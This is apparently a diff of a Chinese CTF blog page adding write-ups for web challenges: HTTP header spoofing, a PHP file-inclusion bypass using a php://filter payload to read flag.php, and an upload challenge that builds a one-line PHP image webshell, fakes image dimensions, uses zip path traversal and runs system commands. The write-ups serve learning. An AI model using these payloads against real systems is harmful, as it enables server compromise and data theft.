+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>通过查看页面源代码可以发现一个文件Secret.php，然后构造payload</p>
+<p>/Secret.php</p>
+<p>可以得到<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http1.webp" alt="http1"></p>
+<p>因此，我们将referer改为<a target="_blank" rel="noopener" href="https://www.sycsecret.com/">https://www.Sycsecret.com</a><br>然后我们得到<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http2.webp" alt="http2"></p>
+<p>我们再将User-Agent里将火狐改为Syclover<br>我们得到<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http3.webp" alt="http3"></p>
+<p>然后我们在报文结尾加上X-Forward-For: 127.0.0.1<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http4.webp" alt="http4"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/http/" rel="tag">http</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-[极客大挑战 2019]Secret File(Include文件包含）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File(Include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File(Include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/">
+        Secret File(Include文件包含）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="include文件包含"><a href="#include文件包含" class="headerlink" title="include文件包含"></a>include文件包含</h1><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>通过看页面源码可以看见一个Archive_room.php的文件，通过构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Archive_room.php</span><br></pre></td></tr></table></figure>
+<p>看见一个页面，然后点击select，发现查阅结束</p>
+<p>![极客大挑战 2019Secret File1](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/极客大挑战</a> 2019Secret File1.jpg)</p>
+<p>然后再来一次，这次边点击边抓包，而后再将包发送一次发现一个php文件</p>
+<p>![极客大挑战 2019Secret File2](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/极客大挑战</a> 2019Secret File2.jpg)</p>
+<p>构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secr3t.php</span><br></pre></td></tr></table></figure>
+<p>看见一串源码，并分析源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过分析，发现它过滤了../和tp和intput和data，且还看见了变量file和include文件包含，因此可以使用<br>include文件包含和伪协议，构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>![极客大挑战 2019Secret File3](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/极客大挑战</a> 2019Secret File3.jpg)</p>
+<p>就可以得到一串base64编码的数值，然后进行解码即可得到flag</p>
+<p>strstr(str1,str2)函数：判断str2是否是str1的子串，如果是则返回从str1字符串中str2第一次出现的位置开始到str1字符串的结尾，不是则返回null</p>
+<p>stristr(str1,str2,ture/flase)函数：搜索str2在str1第一次出现的位置，如果是false，则返回第一次出现位置之后的字符串，ture则返回第一次出现位置之前的字符串，默认为flase，搜索不到则返回null</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-Exec(命令执行)" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/16/Exec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/" class="article-date">
   	<time datetime="2021-07-15T16:00:00.000Z" itemprop="datePublished">2021-07-16</time>
 </a>
     </div>
@@ -251,7 +665,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/16/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/">
+      <a class="article-title" href="/2021/07/16/Exec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/">
         Exec
         
       </a>
@@ -308,6 +722,97 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-[ciscn uploads]代码审计和文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/16/%5Bciscn%20uploads%5D%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  	<time datetime="2021-07-15T16:00:00.000Z" itemprop="datePublished">2021-07-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/16/%5Bciscn%20uploads%5D%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+        上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小"><a href="#上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小" class="headerlink" title="上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小"></a>上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小</h1><h2 id="上传表单的制作"><a href="#上传表单的制作" class="headerlink" title="上传表单的制作"></a>上传表单的制作</h2><p>可以通过html来编写上传的表单，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;form action=&quot;http://270d00af-27b8-4527-a8bd-786af2f51c5e.node3.buuoj.cn/?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>同时$_FILE[ ][ ]中的两个括号中填的信息的含义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容如下:</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;userfile&quot;&gt;</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;]</span><br><span class="line">客户端机器文件的原名称。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] </span><br><span class="line">文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;size&#x27;] </span><br><span class="line">已上传文件的大小，单位为字节。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] </span><br><span class="line">文件被上传后在服务端储存的临时文件名。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] </span><br><span class="line">和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。</span><br><span class="line">注: 在 PHP 4.1.0 版本以前该数组的名称为 $HTTP_POST_FILES，它并不像 $_FILES 一样是自动全局变量。PHP 3 不支持 $HTTP_POST_FILES 数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="图片马的制作"><a href="#图片马的制作" class="headerlink" title="图片马的制作"></a>图片马的制作</h2><p>可以通过png-IDAT-Payload-Generator制作图片马，这个工具可以在github中找到，直接运行其中的generate.py软件就可以制作了。但是直接运行代码制作的代码的木马是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>要执行这一个木马，需要get提交0=system，然后再post提交1=ls+/etc就可以访问系统的配置文件</p>
+<p>然后我们可以通过CyberChef来对上面中的generate.py文件中的payload部分进行修改，从而制作自己喜欢的一句话木马的图片马<br>![ciscn upload1](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ciscn">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ciscn</a> upload1.jpg)</p>
+<p>具体可以看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangdie666/article/details/116997461">https://blog.csdn.net/jiangdie666/article/details/116997461</a></p>
+<h2 id="特殊字符的绕过"><a href="#特殊字符的绕过" class="headerlink" title="特殊字符的绕过"></a>特殊字符的绕过</h2><p>如果代码中出现mb_strtolower()这一个php函数的话，它的作用是让字符串变为小写，则可以使用unicode中的一些相似的字符对要过滤的字符进行一个绕过，其中的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符i可以使用unicode中的İ进行绕过，其中可以将İ变为url形式为%c4%b0</span><br></pre></td></tr></table></figure>
+
+<h2 id="修改文件的大小"><a href="#修改文件的大小" class="headerlink" title="修改文件的大小"></a>修改文件的大小</h2><p>文件可以通过加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 想要的宽度大小</span><br><span class="line">#define height 想要的高度大小</span><br></pre></td></tr></table></figure>
+<p>来伪造文件的大小，而如果是图片，则将它们放在头部，而如果是zip文件，则可以通过抓包的形式放在文件的尾部</p>
+<h2 id="ciscn-upload的实例"><a href="#ciscn-upload的实例" class="headerlink" title="ciscn upload的实例"></a>ciscn upload的实例</h2><p>打开网址，可以看见一串代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (!isset($_GET[&quot;ctf&quot;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&quot;ctf&quot;]))</span><br><span class="line">    $ctf = $_GET[&quot;ctf&quot;];</span><br><span class="line"></span><br><span class="line">if($ctf==&quot;poc&quot;) &#123;</span><br><span class="line">    $zip = new \ZipArchive();</span><br><span class="line">    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];</span><br><span class="line">    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;</span><br><span class="line">        die(&quot;要不咱们再看看？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;</span><br><span class="line">        die (&quot;都不能解压呢&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &quot;可以解压，我想想存哪里&quot;;</span><br><span class="line">    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(&quot;$pos_for_zip/*&quot;);</span><br><span class="line">    foreach($files as $file)&#123;</span><br><span class="line">        if (is_dir($file)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [&#x27;x&#x27; =&gt; 0, &#x27;y&#x27; =&gt; 0, &#x27;width&#x27; =&gt; $size, &#x27;height&#x27; =&gt; $size]);</span><br><span class="line">        if ($second !== FALSE) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[&quot;basename&quot;];</span><br><span class="line">            imagepng($second, &#x27;example/&#x27;.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过对代码的审计，我们知道?ctf=upload的时候可以上传文件，因此我们可以制造表单进行上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;form action=&quot;http://270d00af-27b8-4527-a8bd-786af2f51c5e.node3.buuoj.cn/?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>而通过代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$imageinfo = getimagesize($_FILES[&#x27;postedFile&#x27;][&#x27;tmp_name&#x27;]);</span><br></pre></td></tr></table></figure>
+<p>getimagesize()函数是获取图片的尺寸和大小，其中$_FILES[‘postedFile’][‘tmp_name’]是文件上传后服务端存储的临时文件名，因此我们可知需要我们上传图片，同时通过代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> if ($_FILES[&#x27;postedFile&#x27;][&#x27;size&#x27;] &gt; 1024*512) &#123;</span><br><span class="line">        die(&quot;这么大个的东西你是想d我吗？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;</span><br><span class="line">        die(&quot;东西不能方方正正的话就很讨厌&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>我们可知我们上传的文件的大小要超过1024<em>512，但是文件的宽要为1，高也要为1，因此可以制造一个图片马，图片马的大小超过1024</em>512，来绕过($_FILES[‘postedFile’][‘size’] &gt; 1024*512)，而使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure>
+<p>伪造文件的宽和高来绕过$imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1，可以通过抓包将这两条代码放在文件尾部（zip文件一般放在尾部），这是由于通过扫描文件，可以知道还有一个example.php文件，代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (!isset($_GET[&quot;ctf&quot;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&quot;ctf&quot;]))</span><br><span class="line">    $ctf = $_GET[&quot;ctf&quot;];</span><br><span class="line"></span><br><span class="line">if($ctf==&quot;poc&quot;) &#123;</span><br><span class="line">    $zip = new \ZipArchive();</span><br><span class="line">    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];</span><br><span class="line">    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;</span><br><span class="line">        die(&quot;要不咱们再看看？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;</span><br><span class="line">        die (&quot;都不能解压呢&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &quot;可以解压，我想想存哪里&quot;;</span><br><span class="line">    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(&quot;$pos_for_zip/*&quot;);</span><br><span class="line">    foreach($files as $file)&#123;</span><br><span class="line">        if (is_dir($file)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [&#x27;x&#x27; =&gt; 0, &#x27;y&#x27; =&gt; 0, &#x27;width&#x27; =&gt; $size, &#x27;height&#x27; =&gt; $size]);</span><br><span class="line">        if ($second !== FALSE) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[&quot;basename&quot;];</span><br><span class="line">            imagepng($second, &#x27;example/&#x27;.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过审计代码，可知我们要上传的是zip文件，因此我们需要将图片马文件压缩为zip文件，而后通过构造?ctf=poc对文件进行解压，通过两个文件的代码可知道文件解压到example../image/目录下，因此可以再get提交?ctf=poc的同时，post提交file=../image/a.zip（上传的压缩包名）</p>
+<p>然后我们可以get提交0=system，同时post提交1=ls+/etc来访问系统配置文件，最后找到flag文件所在处，用1=cat+/文件路径打开文件进行读取</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangdie666/article/details/116997461">https://blog.csdn.net/jiangdie666/article/details/116997461</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
 	</div>
 
       
